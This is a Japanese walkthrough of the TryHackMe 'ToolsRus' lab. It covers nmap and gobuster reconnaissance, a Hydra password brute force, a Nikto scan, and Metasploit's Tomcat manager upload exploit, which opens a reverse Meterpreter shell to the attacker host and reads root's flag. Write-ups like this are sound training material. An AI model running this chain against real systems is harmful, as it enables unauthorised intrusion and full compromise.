# ToolsRus
https://tryhackme.com/room/toolsrus

```shell
[root@kali]# nmap -sC -sV -Pn 10.10.80.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-15 15:49 JST
Nmap scan report for 10.10.80.110
Host is up (0.26s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cf:c8:7f:b7:ae:a1:b1:af:e5:ca:31:93:86:2d:e4:fb (RSA)
|   256 5f:89:29:c0:31:2d:be:e0:4a:a0:7f:5d:34:bf:84:11 (ECDSA)
|_  256 d5:eb:49:ca:6f:d5:b1:ee:fd:3d:dd:cd:3a:40:8c:c4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.43 seconds
```

ブラウザで`:80`のトップページに行っても何もないので、ディレクトリを探す。  
```shell
[root@kali]# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e -x php,html,txt -u http://10.10.80.110
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.80.110
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/15 16:00:27 Starting gobuster
===============================================================
http://10.10.80.110/index.html (Status: 200)
http://10.10.80.110/guidelines (Status: 301)
http://10.10.80.110/protected (Status: 401)
```
### #1 	What directory can you find, that begins with a "g"?
> guidelines

`bob`というユーザがいる様子。
```shell
[root@kali]# wget -q -O - http://10.10.80.110/guidelines/
Hey <b>bob</b>, did you update that TomCat server?
```
### #2 Whose name can you find from this directory?
> bob

`http://10.10.80.110/protected`にアクセスするとBasic認証を求められる。

### #3 What directory has basic authentication?
> protected

`bob`のパスワードを探す。  
```shell
[root@kali]# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.80.110 http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-15 16:08:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.80.110:80/protected
[80][http-get] host: 10.10.80.110   login: bob   password: XXXXXXXX
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-15 16:08:09
```
### #4 What is bob's password to the protected part of the website?
> 🙅‍♂️

`bob:XXXXXXXX`でログインできるが、下のメッセージが表示されるので他のポートを見に行く。    
*This protected page has now moved to a different port.*

### #5 What other port that serves a webs service is open on the machine?
> 1234

`http://10.10.80.110:1234/`にアクセスするとTomcatのデフォルトページが表示される。  
### #6 Going to the service running on that port, what is the name and version of the software?
> Apache Tomcat/7.0.88

`dirbuster`で探すと`:1234`の認証画面`/manager/html`が見つかる。
認証情報を付けて、Niktoでスキャンをかける。  
`Tomcat documentation found`の行数を数えればよい。
```shell
[root@kali]# nikto id bob:XXXXXXXX -h http://10.10.80.110:1234/manager/html
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.80.110
+ Target Hostname:    10.10.80.110
+ Target Port:        1234
+ Start Time:         2020-08-15 17:08:31 (GMT9)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/jk-status/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/admin/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html/httpd.conf: Apache httpd.conf configuration file
+ /manager/html/httpd.conf.bak: Apache httpd.conf configuration file
+ /manager/html/manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-manager/status: Default Tomcat Server Status interface found
+ /manager/html/jk-status/status: Default Tomcat Server Status interface found
+ /manager/html/admin/status: Default Tomcat Server Status interface found
+ /manager/html/host-manager/status: Default Tomcat Server Status interface found
+ 8043 requests: 0 error(s) and 24 item(s) reported on remote host
+ End Time:           2020-08-15 17:48:35 (GMT9) (2404 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
### #7 Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?
> 5

`http://10.10.80.110/aaa`など、存在しないパスにアクセスするとApacheバージョンが表示される。  
### #8 What is the server version (run the scan against port 80)?
> Apache/2.4.18

Niktoの結果やServerヘッダにCoyoteのバージョンが表示されている。  
### #9 What version of Apache-Coyote is this service using?
> 1.1

使えそうな手法を探す。  
```shell
[root@kali]# searchsploit -t tomcat code execution
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)                | windows/remote/47073.rb
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Exec | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Exec | windows/webapps/42953.txt
Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)            | multiple/remote/16317.rb
Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit)              | multiple/remote/31433.rb
Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object - Remot | php/remote/28713.php
Tomcat - Remote Code Execution via JSP Upload Bypass (Metasploit)                                   | java/remote/43008.rb
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Metasploitから。接続を試みる。    
```shell
[root@kali]# msfconsole
msf5 > search tomcat deployer
：
   21  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
：
msf5 exploit(multi/http/tomcat_mgr_deploy) > set rhosts 10.10.80.110
rhosts => 10.10.80.110
msf5 exploit(multi/http/tomcat_mgr_deploy) > set rport 1234
rport => 1234
msf5 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername bob
HttpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword XXXXXXXXX
HttpPassword => XXXXXXXX
msf5 exploit(multi/http/tomcat_mgr_deploy) > run
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.9.22.111:4444
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.9.22.111:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying qszctRV98NJ0vvr0q0RPty9...
[*] Executing qszctRV98NJ0vvr0q0RPty9...
[*] Sending stage (53944 bytes) to 10.10.80.110
[*] Meterpreter session 1 opened (10.9.22.111:4444 -> 10.10.80.110:52756) at 2020-08-15 16:50:13 +0900
[*] Undeploying qszctRV98NJ0vvr0q0RPty9 ...

meterpreter > pwd
/
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-12 01:06:14 +0900  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-23 02:15:21 +0900  .bashrc
40777/rwxrwxrwx   4096  dir   2019-03-12 00:30:33 +0900  .nano
100667/rw-rw-rwx  148   fil   2015-08-18 00:30:33 +0900  .profile
40777/rwxrwxrwx   4096  dir   2019-03-11 06:52:32 +0900  .ssh
100667/rw-rw-rwx  658   fil   2019-03-12 01:05:22 +0900  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-12 01:05:22 +0900  flag.txt
40776/rwxrwxrw-   4096  dir   2019-03-11 06:52:43 +0900  snap

meterpreter > cat flag.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### #10	Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?
> root

### #11 What text is in the file /root/flag.txt
> 🙅‍♂️
